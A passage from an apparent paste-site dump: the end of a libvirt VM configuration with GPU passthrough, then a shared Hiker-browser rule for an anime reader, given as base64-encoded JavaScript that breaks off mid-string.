  </os>
  <features>
    <acpi/>
    <apic eoi='on'/>
    <hap state='on'/>
    <hyperv mode='custom'>
      <relaxed state='on'/>
      <vapic state='on'/>
      <spinlocks state='on' retries='8191'/>
      <vpindex state='on'/>
      <runtime state='on'/>
      <synic state='on'/>
      <stimer state='on'>
        <direct state='on'/>
      </stimer>
      <reset state='on'/>
      <vendor_id state='on' value='1234567890ab'/>
      <frequencies state='on'/>
      <reenlightenment state='on'/>
      <tlbflush state='on'/>
      <ipi state='on'/>
      <avic state='on'/>
    </hyperv>
    <kvm>
      <hidden state='on'/>
      <hint-dedicated state='on'/>
      <poll-control state='on'/>
      <pv-ipi state='on'/>
    </kvm>
    <pmu state='off'/>
    <vmport state='off'/>
    <smm state='on'>
      <tseg unit='MiB'>64</tseg>
    </smm>
    <ioapic driver='kvm'/>
  </features>
  <cpu mode='host-passthrough' check='full' migratable='off'>
    <topology sockets='1' dies='1' cores='7' threads='2'/>
    <cache mode='passthrough'/>
    <feature policy='disable' name='x2apic'/>
    <feature policy='require' name='tsc-deadline'/>
    <feature policy='require' name='tsc_adjust'/>
    <feature policy='require' name='arch-capabilities'/>
    <feature policy='require' name='rdctl-no'/>
    <feature policy='require' name='skip-l1dfl-vmentry'/>
    <feature policy='require' name='mds-no'/>
    <feature policy='require' name='pschange-mc-no'/>
    <feature policy='require' name='topoext'/>
    <feature policy='disable' name='svm'/>
    <feature policy='require' name='hypervisor'/>
    <feature policy='require' name='invtsc'/>
    <feature policy='require' name='ibpb'/>
    <feature policy='require' name='virt-ssbd'/>
    <feature policy='require' name='pdpe1gb'/>
    <feature policy='require' name='cmp_legacy'/>
    <feature policy='require' name='xsaves'/>
    <feature policy='require' name='perfctr_core'/>
    <feature policy='require' name='clzero'/>
    <feature policy='require' name='xsaveerptr'/>
  </cpu>
  <clock offset='timezone' timezone='Europe/Prague'>
    <timer name='rtc' present='no' tickpolicy='catchup'/>
    <timer name='pit' tickpolicy='discard'/>
    <timer name='hpet' present='no'/>
    <timer name='kvmclock' present='no'/>
    <timer name='hypervclock' present='yes'/>
    <timer name='tsc' present='yes' mode='native'/>
  </clock>
  <on_poweroff>destroy</on_poweroff>
  <on_reboot>destroy</on_reboot>
  <on_crash>destroy</on_crash>
  <pm>
    <suspend-to-mem enabled='no'/>
    <suspend-to-disk enabled='no'/>
  </pm>
  <devices>
    <emulator>/usr/bin/qemu-system-x86_64</emulator>
    <disk type='file' device='disk'>
      <driver name='qemu' type='raw' cache='none' io='io_uring' discard='unmap'/>
      <source file='/crypt/win2-storage/disk.raw'/>
      <backingStore/>
      <target dev='vda' bus='scsi'/>
      <boot order='1'/>
      <address type='drive' controller='0' bus='0' target='0' unit='0'/>
      <blockio discard_granularity='33554432'/>
    </disk>
    <disk type='file' device='disk'>
      <driver name='qemu' type='raw' cache='none' io='io_uring' discard='unmap'/>
      <source file='/zrcadlo2/win2-storage2/disk.raw'/>
      <backingStore/>
      <target dev='vdb' bus='scsi'/>
      <address type='drive' controller='0' bus='0' target='1' unit='0'/>
      <blockio discard_granularity='33554432'/>
    </disk>
    <disk type='file' device='disk'>
      <driver name='qemu' type='raw' cache='none' io='io_uring' discard='unmap'/>
      <source file='/ssdpool1/win2-storage3/disk.raw'/>
      <backingStore/>
      <target dev='vdc' bus='scsi'/>
      <address type='drive' controller='0' bus='0' target='2' unit='0'/>
      <blockio discard_granularity='33554432'/>
    </disk>
    <disk type='file' device='disk'>
      <driver name='qemu' type='raw' cache='none' io='io_uring' discard='unmap'/>
      <source file='/ssdpool2/win2-storage4/disk.raw'/>
      <backingStore/>
      <target dev='vdd' bus='scsi'/>
      <address type='drive' controller='0' bus='0' target='3' unit='0'/>
      <blockio discard_granularity='33554432'/>
    </disk>
    <controller type='pci' index='0' model='pcie-root'/>
    <controller type='pci' index='1' model='dmi-to-pci-bridge'>
      <model name='i82801b11-bridge'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x1e' function='0x0' multifunction='on'/>
    </controller>
    <controller type='pci' index='2' model='pci-bridge'>
      <model name='pci-bridge'/>
      <target chassisNr='2'/>
      <address type='pci' domain='0x0000' bus='0x01' slot='0x00' function='0x0'/>
    </controller>
    <controller type='pci' index='3' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='3' port='0x10'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x02' function='0x0' multifunction='on'/>
    </controller>
    <controller type='pci' index='4' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='4' port='0x11'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x02' function='0x1'/>
    </controller>
    <controller type='pci' index='5' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='5' port='0x12'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x02' function='0x2'/>
    </controller>
    <controller type='pci' index='6' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='6' port='0x13'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x02' function='0x3'/>
    </controller>
    <controller type='pci' index='7' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='7' port='0x8'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x01' function='0x0' multifunction='on'/>
    </controller>
    <controller type='pci' index='8' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='8' port='0x9'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x01' function='0x1'/>
    </controller>
    <controller type='scsi' index='0' model='virtio-scsi'>
      <driver queues='8' iothread='1'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x1e' function='0x2'/>
    </controller>
    <controller type='sata' index='0'>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x1f' function='0x2'/>
    </controller>
    <controller type='usb' index='0' model='nec-xhci' ports='6'>
      <address type='pci' domain='0x0000' bus='0x04' slot='0x00' function='0x0'/>
    </controller>
    <interface type='bridge'>
      <mac address='52:54:00:46:db:27'/>
      <source bridge='br0'/>
      <model type='virtio'/>
      <driver queues='8'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x03' function='0x0'/>
    </interface>
    <input type='mouse' bus='ps2'/>
    <input type='keyboard' bus='ps2'/>
    <tpm model='tpm-tis'>
      <backend type='emulator' version='2.0'/>
    </tpm>
    <audio id='1' type='none'/>
    <hostdev mode='subsystem' type='pci' managed='yes'>
      <driver name='vfio'/>
      <source>
        <address domain='0x0000' bus='0x29' slot='0x00' function='0x0'/>
      </source>
      <rom file='/usr/share/ovmf/rx7900xt.rom'/>
      <address type='pci' domain='0x0000' bus='0x03' slot='0x00' function='0x0' multifunction='on'/>
    </hostdev>
    <hostdev mode='subsystem' type='pci' managed='yes'>
      <driver name='vfio'/>
      <source>
        <address domain='0x0000' bus='0x29' slot='0x00' function='0x1'/>
      </source>
      <address type='pci' domain='0x0000' bus='0x03' slot='0x00' function='0x1'/>
    </hostdev>
    <hostdev mode='subsystem' type='pci' managed='yes'>
      <driver name='vfio'/>
      <source>
        <address domain='0x0000' bus='0x29' slot='0x00' function='0x2'/>
      </source>
      <address type='pci' domain='0x0000' bus='0x03' slot='0x00' function='0x2'/>
    </hostdev>
    <hostdev mode='subsystem' type='pci' managed='yes'>
      <driver name='vfio'/>
      <source>
        <address domain='0x0000' bus='0x29' slot='0x00' function='0x3'/>
      </source>
      <address type='pci' domain='0x0000' bus='0x03' slot='0x00' function='0x3'/>
    </hostdev>
    <hostdev mode='subsystem' type='usb' managed='yes'>
      <source>
        <vendor id='0x0458'/>
        <product id='0x6007'/>
        <address bus='3' device='2'/>
      </source>
      <address type='usb' bus='0' port='3'/>
    </hostdev>
    <hostdev mode='subsystem' type='pci' managed='yes'>
      <driver name='vfio'/>
      <source>
        <address domain='0x0000' bus='0x2b' slot='0x00' function='0x3'/>
      </source>
      <address type='pci' domain='0x0000' bus='0x06' slot='0x00' function='0x0'/>
    </hostdev>
    <watchdog model='itco' action='reset'/>
    <memballoon model='none'/>
  </devices>
  <seclabel type='dynamic' model='dac' relabel='yes'/>
<qemu:commandline>
<qemu:arg value=""-fw_cfg""/>
<qemu:arg value=""opt/ovmf/X-PciMmio64Mb,string=65536""/>
</qemu:commandline>
</domain>"
2JuJPzr5,邀您一起看：⚙ 阅动漫🔮设置 ⚙,xiaomianao666,JavaScript,Thursday 16th of May 2024 03:08:21 AM CDT,海阔视界规则分享，当前分享的是：二级页面详情￥page_detail￥⚙ 阅动漫🔮设置 ⚙@@eyJkYXRhIjoie1wiYXNzb2NpYXRlZE1vZGVsc01hcEZvckpvaW5UYWJsZVwiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhGS1wiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhvdXRGS1wiOnt9LFwiZmllbGRzVG9TZXRUb0RlZmF1bHRcIjpbXSxcImdtdE1vZGlmaWVkXCI6MCxcImlkXCI6MCxcImxhc3RfY2hhcHRlcl9ydWxlXCI6XCJcIixcImxpc3RUb0NsZWFyQXNzb2NpYXRlZEZLXCI6W10sXCJsaXN0VG9DbGVhclNlbGZGS1wiOltdLFwicGFnZUxpc3RcIjpbe1wiY29sX3R5cGVcIjpcInRleHRfMVwiLFwibmFtZVwiOlwiQ2xhc3NUYWJcIixcInBhdGhcIjpcIkNsYXNzVGFiXCIsXCJydWxlXCI6XCJ2YXIge1xcbiAgICBRSU5HX1RJVExFLCB0aXRsZSwgdXJsLFxcbiAgICBjbGFzc19uYW1lLCBjbGFzc191cmwsXFxuICAgIGFyZWFfbmFtZSwgYXJlYV91cmwsXFxuICAgIHllYXJfbmFtZSwgeWVhcl91cmwsXFxuICAgIHNvcnRfbmFtZSwgc29ydF91cmxcXG59ID0gJC5pbXBvcnRQYXJhbVxcbmNvbnN0IENsYXNzVGFiID0gZnVuY3Rpb24oY2xhc3NBcnJheSwgcGFyYW1zKSB7XFxuICAgIE9iamVjdC5hc3NpZ24odGhpcywgcGFyYW1zKVxcbiAgICB0aGlzLmFyciA9IGNsYXNzQXJyYXkubWFwKHYgPT4gdGhpcy5pbml0KHYpKVxcbiAgICB0aGlzLnNpZ24gPSAnJCcgKyBRSU5HX1RJVExFICsgJ18nICsgKHRoaXMubmFtZSB8fCAnJykgKyAnXydcXG4gICAgdGhpcy5jb2xvciA9IHRoaXMuY29sb3IgfHwgJyMxMmI2NjgnXFxuICAgIHRoaXMuYm91bmRhcnkgPSB0aGlzLmJvdW5kYXJ5IHx8ICdibGFua19ibG9jaydcXG59XFxuQ2xhc3NUYWIucHJvdG90eXBlID0ge1xcbiAgICBjb25zdHJ1Y3RvcjogQ2xhc3NUYWIsXFxuICAgIGxvYWQoZWwpIHtcXG4gICAgICAgIGxldCBmb2xkZWQgPSB0aGlzLmZvbGQgJiYgZ2V0VmFyKCckZm9sZF8nICsgdGhpcy5zaWduLCAnJylcXG4gICAgICAgIGlmICh0aGlzLmFyci5sZW5ndGggPiAxICYmIHRoaXMuZm9sZCkgZWwucHVzaCh7XFxuICAgICAgICAgICAgdGl0bGU6ICfigJzigJzigJ3igJ0nICsgKGZvbGRlZCA/ICfilrYnIDogJ+KWvCcpLmZvbnRjb2xvcignIzA0OWVmZicpLFxcbiAgICAgICAgICAgIHVybDogJCgnI25vTG9hZGluZyMnKS5sYXp5UnVsZSgoc2lnbiwgZm9sZGVkKSA9PiB7XFxuICAgICAgICAgICAgICAgIHB1dFZhcignJGZvbGRfJyArIHNpZ24sIGZvbGRlZCA/ICcnIDogJ1QnKVxcbiAgICAgICAgICAgICAgICByZWZyZXNoUGFnZShmYWxzZSlcXG4gICAgICAgICAgICAgICAgcmV0dXJuICdoaWtlcjovL2VtcHR5J1xcbiAgICAgICAgICAgIH0sIHRoaXMuc2lnbiwgZm9sZGVkKSxcXG4gICAgICAgICAgICBjb2xfdHlwZTogJ3Njcm9sbF9idXR0b24nXFxuICAgICAgICB9KVxcbiAgICAgICAgbGV0IGFyciA9IGZvbGRlZCA/IFt0aGlzLmFyclswXV0gOiB0aGlzLmFyclxcbiAgICAgICAgYXJyLmZvckVhY2goKHYpID0+IHtcXG4gICAgICAgICAgICBsZXQgeyBpZCwgY2xhc3NfbmFtZSwgY2xhc3NfdXJsIH0gPSB2LFxcbiAgICAgICAgICAgIHNlbGVjdGVkID0gSlNPTi5zdHJpbmdpZnkodGhpcy5nZXRDbGFzcyhpZCkpXFxuICAgICAgICAgICAgY2xhc3NfbmFtZS5mb3JFYWNoKChuYW1lLCBpKSA9PiB7XFxuICAgICAgICAgICAgICAgIGxldCB1cmwgPSBjbGFzc191cmxbaV0sXFxuICAgICAgICAgICAgICAgICAgICBub3cgPSBKU09OLnN0cmluZ2lmeSh7IG5hbWU6IG5hbWUsIHVybDogdXJsIH0pXFxuICAgICAgICAgICAgICAgIGVsLnB1c2goe1xcbiAgICAgICAgICAgICAgICAgICAgdGl0bGU6IHNlbGVjdGVkID09IG5vdyA/ICfigJzigJzigJ3igJ0nICsgbmFtZS5mb250Y29sb3IodGhpcy5jb2xvcikuYm9sZCgpIDogbmFtZSxcXG4gICAgICAgICAgICAgICAgICAgIHVybDogc2VsZWN0ZWQgPT0gbm93ID8gJ2hpa2VyOi8vZW1wdHknIDogJCgnI25vTG9hZGluZyMnKS5sYXp5UnVsZSgoc2lnbiwgaWQsIG5vdykgPT4ge1xcbiAgICAgICAgICAgICAgICAgICAgICAgIHB1dFZhcihzaWduICsgaWQsIG5vdylcXG4gICAgICAgICAgICAgICAgICAgICAgICByZWZyZXNoUGFnZShmYWxzZSlcXG4gICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxuICAgICAgICAgICAgICAgICAgICB9LCB0aGlzLnNpZ24sIGlkLCBub3cpLFxcbiAgICAgICAgICAgICAgICAgICAgY29sX3R5cGU6ICdzY3JvbGxfYnV0dG9uJ1xcbiAgICAgICAgICAgICAgICB9KVxcbiAgICAgICAgICAgIH0pXFxuICAgICAgICAgICAgZWwucHVzaCh7IGNvbF90eXBlOiB0aGlzLmJvdW5kYXJ5IH0pXFxuICAgICAgICB9KVxcbiAgICB9LFxcbiAgICBpbml0KGNsYXNzT2JqZWN0KSB7XFxuICAgICAgICBpZiAodHlwZW9mIGNsYXNzT2JqZWN0LmNsYXNzX25hbWUgPT0gJ3N0cmluZycpXFxuICAgICAgICAgICAgY2xhc3NPYmplY3QuY2xhc3NfbmFtZSA9IGNsYXNzT2JqZWN0LmNsYXNzX25hbWUuc3BsaXQoJyYnKVxcbiAgICAgICAgaWYgKHR5cGVvZiBjbGFzc09iamVjdC5jbGFzc191cmwgPT0gJ3N0cmluZycpXFxuICAgICAgICAgICAgY2xhc3NPYmplY3QuY2xhc3NfdXJsID0gY2xhc3NPYmplY3QuY2xhc3NfdXJsLnNwbGl0KCcmJykubWFwKCh2KSA9PiB2LnRyaW0oKSlcXG4gICAgICAgIHJldHVybiBjbGFzc09iamVjdFxcbiAgICB9LFxcbiAgICBwdXNoKGNsYXNzT2JqZWN0KSB7XFxuICAgICAgICB0aGlzLmFyci5wdXNoKHRoaXMuaW5pdChjbGFzc09iamVjdCkpXFxuICAgIH0sXFxuICAgIGdldENsYXNzKGlkKSB7XFxuICAgICAgICBsZXQgZGVmYXVsdENsYXNzID0gdGhpcy5hcnIuZmluZChpdGVtID0+IGl0ZW0uaWQgPT0gaWQpXFxuICAgICAgICBkZWZhdWx0Q2xhc3MgPSBKU09OLnN0cmluZ2lmeShkZWZhdWx0Q2xhc3MgPyB7XFxuICAgICAgICAgICAgbmFtZTogZGVmYXVsdENsYXNzLmNsYXNzX25hbWVbMF0sXFxuICAgICAgICAgICAgdXJsOiBkZWZhdWx0Q2xhc3MuY2xhc3NfdXJsWzBdXFxuICAgICAgICB9IDogeyBuYW1lOiAgJ2Nhbm5vdCBmaW5kIGlkOiAnICsgaWQgKyAnIGluIGNsYXNzVGFiOiAnICsgdGhpcy5zaWduLCB1cmw6ICcnfSlcXG4gICAgICAgIHJldHVybiBKU09OLnBhcnNlKGdldFZhcih0aGlzLnNpZ24gKyBpZCwgZGVmYXVsdENsYXNzKSlcXG4gICAgfSxcXG4gICAgc2V0VXJsKHVybCkge1xcbiAgICAgICAgcmV0dXJuIHVybC5yZXBsYWNlKC9cXFxcJFxcXFx7KFtefV0qKVxcXFx9L2csIChfLCBpZCkgPT4gdGhpcy5nZXRDbGFzcyhpZCkudXJsKVxcbiAgICB9XFxufVxcbi8vIOeUn+aIkOWktOmDqOWIhuexu1xcbmxldCBmeUFsbCA9IHVybC5pbmNsdWRlcygnZnlBbGwnKSxcXG4gICAgdGFiSGVhZGVyID0gW11cXG5pZiAoY2xhc3NfbmFtZSkgdGFiSGVhZGVyLnB1c2goe1xcbiAgICBpZDogZnlBbGwgPyAnZnlBbGwnIDogJ2Z5Y2xhc3MnLFxcbiAgICBjbGFzc19uYW1lOiBjbGFzc19uYW1lLFxcbiAgICBjbGFzc191cmw6IGNsYXNzX3VybFxcbn0pXFxuaWYgKGFyZWFfbmFtZSkgdGFiSGVhZGVyLnB1c2goe1xcbiAgICBpZDogZnlBbGwgPyAnZnlBbGwnIDogJ2Z5YXJlYScsXFxuICAgIGNsYXNzX25hbWU6IGFyZWFfbmFtZSxcXG4gICAgY2xhc3NfdXJsOiBhcmVhX3VybFxcbn0pXFxuaWYgKHllYXJfbmFtZSkgdGFiSGVhZGVyLnB1c2goe1xcbiAgICBpZDogZnlBbGwgPyAnZnlBbGwnIDogJ2Z5eWVhcicsXFxuICAgIGNsYXNzX25hbWU6IHllYXJfbmFtZSxcXG4gICAgY2xhc3NfdXJsOiB5ZWFyX3VybFxcbn0pXFxuaWYgKHNvcnRfbmFtZSkgdGFiSGVhZGVyLnB1c2goe1xcbiAgICBpZDogZnlBbGwgPyAnZnlBbGwnIDogJ2Z5c29ydCcsXFxuICAgIGNsYXNzX25hbWU6IHNvcnRfbmFtZSxcXG4gICAgY2xhc3NfdXJsOiBzb3J0X3VybFxcbn0pXFxuJC5leHBvcnRzID0ge1xcbiAgICBmeUFsbDogZnlBbGwsXFxuICAgIHRhYkhlYWRlcjogbmV3IENsYXNzVGFiKHRhYkhlYWRlciwgeyBuYW1lOiB0aXRsZSwgZm9sZDogcmVhZEZpbGUoJ3RhYkZvbGQnKSwgfSlcXG59XFxuXCJ9LHtcImNvbF90eXBlXCI6XCJtb3ZpZV8zXCIsXCJuYW1lXCI6XCLmlbDmja7ovb3lhaVcIixcInBhdGhcIjpcImRhdGFMb2FkXCIsXCJydWxlXCI6XCJsZXQgc2hvd0FsbCA9ICQuaW1wb3J0UGFyYW0sXFxuICAgIHVybCA9IGdldE15VmFyKCdyZW1vdGVVcmwnKSxcXG4gICAgZGF0YSA9IFtdXFxuaWYgKHVybC5zdGFydHNXaXRoKCdoaWtlcjovLycpIHx8IHVybC5zdGFydHNXaXRoKCdmaWxlOi8vJykpIHtcXG4gICAgLy8g5aaC5p6c5Li65pys5Zyw5paH5Lu25YiZ5LiN6L+b6KGM57yT5a2YXFxuICAgIHRyeSB7XFxuICAgICAgICBsZXQgb3JpRGF0YSA9IGZldGNoKHVybClcXG4gICAgICAgIGlmICh1cmwuc3RhcnRzV2l0aCgnaGlrZXI6Ly9wYWdlLycpKVxcbiAgICAgICAgICAgIG9yaURhdGEgPSBKU09OLnBhcnNlKG9yaURhdGEpLnJ1bGVcXG4gICAgICAgIGRhdGEgPSBKU09OLnBhcnNlKG9yaURhdGEpXFxuICAgIH0gY2F0Y2ggKGUpIHt9XFxufSBlbHNlIHtcXG4gICAgLy8g6I635Y+W6L+c56iL5pWw5o2u77yM5qOA5p+l6Ze06ZqU6buY6K6k5LiA5aSpXFxuICAgIGxldCBpbnRlcnZhbCA9IHBhcnNlSW50KHJlYWRGaWxlKCd1cGRhdGVJbnRlcnZhbCcpIHx8ICcxJyksXFxuICAgICAgICBvbGREYXRhID0gZmV0Y2goJ2hpa2VyOi8vZmlsZXMvbGlicy8nICsgbWQ1KHVybCkgKyAnLmpzJyksXFxuICAgICAgICByZW1vdGVEYXRhID0gW11cXG4gICAgaWYgKGludGVydmFsID09IDApIGludGVydmFsID0gLTFcXG4gICAgdHJ5IHsgcmVtb3RlRGF0YSA9IEpTT04ucGFyc2UoZmV0Y2hDYWNoZSh1cmwsIDI0ICogaW50ZXJ2YWwsIHsgdGltZW91dDogNTAwMDAgfSkpIH0gY2F0Y2ggKGUpIHt9XFxuICAgIGlmICghQXJyYXkuaXNBcnJheShyZW1vdGVEYXRhKSkgcmVtb3RlRGF0YSA9IFtdXFxuICAgIGlmIChyZW1vdGVEYXRhLmxlbmd0aCA8IDMpIHtcXG4gICAgICAgIGxvZygn5pyq6I635Y+W5Yiw5pWw5o2uJylcXG4gICAgICAgIGlmIChvbGREYXRhKSB3cml0ZUZpbGUoJ2hpa2VyOi8vZmlsZXMvbGlicy8nICsgbWQ1KHVybCkgKyAnLmpzJywgb2xkRGF0YSlcXG4gICAgICAgIGRhdGEgPSBKU09OLnBhcnNlKG9sZERhdGEgfHwgJ1tdJylcXG4gICAgfSBlbHNlIHtcXG4gICAgICAgIGxvZygn5bey6I635Y+W5Yiw5pWw5o2uJylcXG4gICAgICAgIGRhdGEgPSByZW1vdGVEYXRhXFxuICAgIH1cXG59XFxuZGF0YSA9IGRhdGEuZmlsdGVyKCh2KSA9PiB2LnRpdGxlICE9IGdldE15VmFyKCdteUNvbGxlY3Rpb24nKSAmJiAhKHYuYXV0aG9yIHx8ICcnKS5pbmNsdWRlcygn6ZiF5Yqo5ryr55Sf5oiQ5ZmoJykpXFxuaWYgKHJlYWRGaWxlKCdkaXNhYmxlQ3VzdG9tJykpICQuZXhwb3J0cyA9IGRhdGFcXG5lbHNlIHsgLy8g5YaZ5YWl6Ieq5a6a5LmJ5pWw5o2uXFxuICAgIGxldCBjdXN0b21EYXRhID0gSlNPTi5wYXJzZShyZWFkRmlsZSgnY3VzdG9tRGF0YScpIHx8ICdbXScpLFxcbiAgICAgICAgcmV3cml0ZURhdGEgPSBbXVxcbiAgICBjdXN0b21EYXRhID0gY3VzdG9tRGF0YS5yZWR1Y2UoKHNlbGYsIHYpID0+IHtcXG4gICAgICAgIGxldCBpbmRleCA9IGRhdGEuZmluZEluZGV4KCh2dikgPT4gdi50aXRsZSA9PSB2di50aXRsZSlcXG4gICAgICAgIGlmIChpbmRleCA+PSAwKSB7XFxuICAgICAgICAgICAgc2VsZi5wdXNoKHYpXFxuICAgICAgICAgICAgbGV0IHJ1bGUgPSBkYXRhLnNwbGljZShpbmRleCwgMSlbMF1cXG4gICAgICAgICAgICBpZiAoc2hvd0FsbCB8fCB2LnZpc2libGUpXFxuICAgICAgICAgICAgICAgIHJld3JpdGVEYXRhLnB1c2goT2JqZWN0LmFzc2lnbihydWxlLCB2KSlcXG4gICAgICAgIH1cXG4gICAgICAgIHJldHVybiBzZWxmXFxuICAgIH0sIFtdKVxcbiAgICBkYXRhLmZvckVhY2goKHYpID0+IGN1c3RvbURhdGEucHVzaCh7IHRpdGxlOiB2LnRpdGxlLCB2aXNpYmxlOiB0cnVlIH0pKVxcbiAgICBzYXZlRmlsZSgnY3VzdG9tRGF0YScsIEpTT04uc3RyaW5naWZ5KGN1c3RvbURhdGEpKVxcbiAgICAkLmV4cG9ydHMgPSByZXdyaXRlRGF0YS5jb25jYXQoZGF0YSlcXG59XFxuXCJ9LHtcImNvbF90eXBlXCI6XCJtb3ZpZV8zXCIsXCJuYW1lXCI6XCLnjq/looPliqvmjIFcIixcInBhdGhcIjpcImhpamFja0VudlwiLFwicnVsZVwiOlwidmFyIHsgUlVMRSwgaXNJbmRleCwgcGFnZVRpdGxlIH0gPSBNWV9QQVJBTVNcXG5SVUxFID0gSlNPTi5wYXJzZShiYXNlNjREZWNvZGUoUlVMRSkpXFxudmFyIG9yaVJVTEUgPSAkLnJlcXVpcmUoJ2hpa2VyOi8vcGFnZS9kYXRhTG9hZD9ydWxlPScgKyBRSU5HX1RJVExFKS5maW5kKCh2KSA9PiB2LnRpdGxlID09IFJVTEUudGl0bGUpXFxuaWYgKGlzSW5kZXgpIHtcXG4gICAgUlVMRSA9IG9yaVJVTEVcXG4gICAgdmFyIHsgdGFiSGVhZGVyLCBmeUFsbCB9ID0gJC5yZXF1aXJlKCdoaWtlcjovL3BhZ2UvQ2xhc3NUYWI/cnVsZT0nICsgUUlOR19USVRMRSwgT2JqZWN0LmFzc2lnbih7IFFJTkdfVElUTEU6IFFJTkdfVElUTEUgfSwgUlVMRSkpXFxuICAgIC8vIOWkhOeQhk1ZX1JVTEVcXG4gICAgTVlfUlVMRS5jbGFzc191cmwgPSB0YWJIZWFkZXIuZ2V0Q2xhc3MoZnlBbGwgPyAnZnlBbGwnIDogJ2Z5Y2xhc3MnKS51cmxcXG4gICAgTVlfUlVMRS5hcmVhX3VybCA9IGZ5QWxsID8gTVlfUlVMRS5jbGFzc191cmwgOiB0YWJIZWFkZXIuZ2V0Q2xhc3MoJ2Z5YXJlYScpLnVybFxcbiAgICBNWV9SVUxFLnllYXJfdXJsID0gZnlBbGwgPyBNWV9SVUxFLmNsYXNzX3VybCA6IHRhYkhlYWRlci5nZXRDbGFzcygnZnl5ZWFyJykudXJsXFxuICAgIE1ZX1JVTEUuc29ydF91cmwgPSBmeUFsbCA/IE1ZX1JVTEUuY2xhc3NfdXJsIDogdGFiSGVhZGVyLmdldENsYXNzKCdmeXNvcnQnKS51cmxcXG4gICAgTVlfUlVMRS51cmwgPSBSVUxFLnVybFxcbiAgICBNWV9SVUxFLmNvbF90eXBlID0gUlVMRS5jb2xfdHlwZVxcbiAgICBNWV9SVUxFLmRldGFpbF9jb2xfdHlwZSA9IFJVTEUuZGV0YWlsX2NvbF90eXBlXFxuICAgIE1ZX1JVTEUuZmluZF9ydWxlID0gUlVMRS5maW5kX3J1bGVcXG4gICAgTVlfUlVMRS5kZXRhaWxfZmluZF9ydWxlID0gUlVMRS5kZXRhaWxfZmluZF9ydWxlXFxuICAgIE1ZX1JVTEUucGFyYW1zID0ge31cXG59IGVsc2Uge1xcbiAgICBSVUxFLnBhZ2VzID0gb3JpUlVMRS5wYWdlc1xcbiAgICAvLyDlpITnkIZNWV9SVUxFXFxuICAgIE1ZX1JVTEUudXJsID0gTVlfUEFSQU1TLnVybFxcbiAgICBNWV9SVUxFLmNvbF90eXBlID0gUlVMRS5kZXRhaWxfY29sX3R5cGVcXG4gICAgTVlfUlVMRS5maW5kX3J1bGUgPSBSVUxFLmRldGFpbF9maW5kX3J1bGVcXG4gICAgTVlfUlVMRS5wYXJhbXMgPSBSVUxFLnBhcmFtc1xcbn1cXG5NWV9SVUxFLnBhZ2VzID0gUlVMRS5wYWdlc1xcbk1ZX1JVTEUucGFnZUxpc3QgPSBKU09OLnBhcnNlKE1ZX1JVTEUucGFnZXMgfHwgJ1tdJylcXG5NWV9SVUxFLnRpdGxlID0gUlVMRS50aXRsZVxcbk1ZX1JVTEUudWEgPSBSVUxFLnVhXFxubG9nKE1ZX1JVTEUudXJsKVxcbi8vIOi9veWFpeWHveaVsOW3peWFt1xcbnZhciB7IGdlbk15UnVsZSB9ID0gJC5yZXF1aXJlKCdoaWtlcjovL3BhZ2UvZnVuY1Rvb2xzP3J1bGU9JyArIFFJTkdfVElUTEUsIHtcXG4gICAgUUlOR19USVRMRTogUUlOR19USVRMRSxcXG4gICAgTVlfUlVMRTogTVlfUlVMRSxcXG4gICAgaXNJbmRleDogaXNJbmRleFxcbn0pXFxuLy8g6Ziy5q2icmVxdWlyZeWkmuasoei/kOihjFxcbmNvbnN0IG15Q29sbF9yZXF1aXJlZCA9IHt9XFxucmVxdWlyZSA9IGZ1bmN0aW9uKHBhcmFtMCwgcGFyYW0xLCBwYXJhbTIsIHBhcmFtMywgcGFyYW00KSB7XFxuICAgIGlmIChteUNvbGxfcmVxdWlyZWRbcGFyYW0wXSkgcmV0dXJuXFxuICAgIG15Q29sbF9yZXF1aXJlZFtwYXJhbTBdID0gdHJ1ZVxcbiAgICBwYXJhbTIgPSBwYXJhbTIgIT0gbnVsbCA/IHBhcmFtMiA6IDBcXG4gICAgcGFyYW0zID0gTVlfVElDS0VUXFxuICAgIHBhcmFtNCA9IGV2YWxcXG4gICAgcmV0dXJuIG1ldGhvZF9yZXF1aXJlLmludm9rZShqYXZhQ29udGV4dCwgcGFyYW0wLCBwYXJhbTEsIHBhcmFtMiwgcGFyYW0zLCBwYXJhbTQpXFxufVxcbnJlcXVpcmVDYWNoZSA9IGZ1bmN0aW9uKHBhcmFtMCwgcGFyYW0xLCBwYXJhbTIsIHBhcmFtMywgcGFyYW00LCBwYXJhbTUpIHtcXG4gICAgaWYgKG15Q29sbF9yZXF1aXJlZFtwYXJhbTBdKSByZXR1cm5cXG4gICAgbXlDb2xsX3JlcXVpcmVkW3BhcmFtMF0gPSB0cnVlXFxuICAgIHBhcmFtMyA9IHBhcmFtMyAhPSBudWxsID8gcGFyYW0zIDogMFxcbiAgICBwYXJhbTQgPSBNWV9USUNLRVRcXG4gICAgcGFyYW01ID0gZXZhbFxcbiAgICByZXR1cm4gbWV0aG9kX3JlcXVpcmVDYWNoZS5pbnZva2UoamF2YUNvbnRleHQsIHBhcmFtMCwgcGFyYW0xLCBwYXJhbTIsIHBhcmFtMywgcGFyYW00LCBwYXJhbTUpXFxufVxcbnJjID0gcmVxdWlyZUNhY2hlXFxuLy8g5pyA5paw56ug6IqC6KeE5YiZ546v5aKD5Yqr5oyBXFxuc2V0TGFzdENoYXB0ZXJSdWxlID0gZnVuY3Rpb24ocGFyYW0wKSB7XFxuICAgIGlmIChwYXJhbTAuc3RhcnRzV2l0aChcXFwianM6XFxcIikpIHtcXG4gICAgICAgIHBhcmFtMCA9ICdqczonICsgJC50b1N0